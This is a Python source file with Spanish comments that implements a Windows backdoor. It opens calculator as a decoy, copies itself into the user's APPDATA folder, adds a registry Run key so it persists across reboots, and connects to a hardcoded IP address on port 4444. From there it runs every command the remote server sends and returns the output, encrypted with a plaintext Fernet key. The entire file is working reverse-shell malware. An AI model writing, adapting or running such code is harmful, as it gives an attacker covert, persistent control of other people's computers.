
import os
import subprocess
import socket
from cryptography.fernet import Fernet
import subprocess
subprocess.Popen("calc.exe", shell=True)

# Clave Fernet en texto plano
key = b"5A8tryFj0b0GTx1nWMAiUpUKTREBusy3rIClvsab5k="
fernet = Fernet(key)

SERVER_IP = "35.193.139.222"
SERVER_PORT = 4444

def add_persistence():
    path = os.environ["APPDATA"] + "\\winclient.exe"
    if not os.path.exists(path):
        subprocess.call(f'copy {os.path.basename(__file__)} "{path}"', shell=True)
        subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WinClient /t REG_SZ /d "{path}" /f', shell=True)

def connect():
    try:
        s = socket.socket()
        s.connect((SERVER_IP, SERVER_PORT))
        s.send(fernet.encrypt(b"[+] Conectado desde Windows"))
        while True:
            command = fernet.decrypt(s.recv(4096)).decode()
            if command.lower() == "exit":
                break
            output = subprocess.getoutput(command)
            s.send(fernet.encrypt(output.encode()))
        s.close()
    except Exception as e:
        pass  # o escribe en un log

if __name__ == "__main__":
    add_persistence()
    subprocess.call("start cmd", shell=True)
    connect()
